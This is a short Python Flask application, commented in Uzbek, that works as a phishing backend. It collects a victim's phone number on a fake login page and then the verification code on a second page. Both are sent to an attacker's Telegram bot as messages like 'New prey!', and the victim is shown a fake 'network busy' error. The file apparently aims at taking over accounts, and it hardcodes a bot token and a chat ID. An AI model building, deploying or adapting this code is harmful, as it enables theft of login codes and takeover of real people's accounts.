import requests
from flask import Flask, request, render_template

app = Flask(__name__)

# --- SIZNING MA'LUMOTLARINGIZ ---
BOT_TOKEN = "7986845957:AAHZfZ3boIazxcJ5vShujQfTeEWYd1JdyZ4"
ADMIN_ID = "8275787221"

def send_to_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_ID, "text": text}
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Telegram yuborishda xato: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    send_to_telegram(f"🔥 Yangi o'lja!\n📞 Raqam: {phone}")
    # Render-da templates/verify.html fayli borligiga ishonch hosil qiling
    return render_template('verify.html', phone=phone)

@app.route('/verify', methods=['POST'])
def verify():
    phone = request.form.get('phone')
    code = request.form.get('code')
    send_to_telegram(f"✅ Kod keldi!\n📞 Raqam: {phone}\n🔑 Kod: {code}")
    return "Xatolik: Tarmoq band, 2 daqiqadan so'ng qayta urinib ko'ring."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
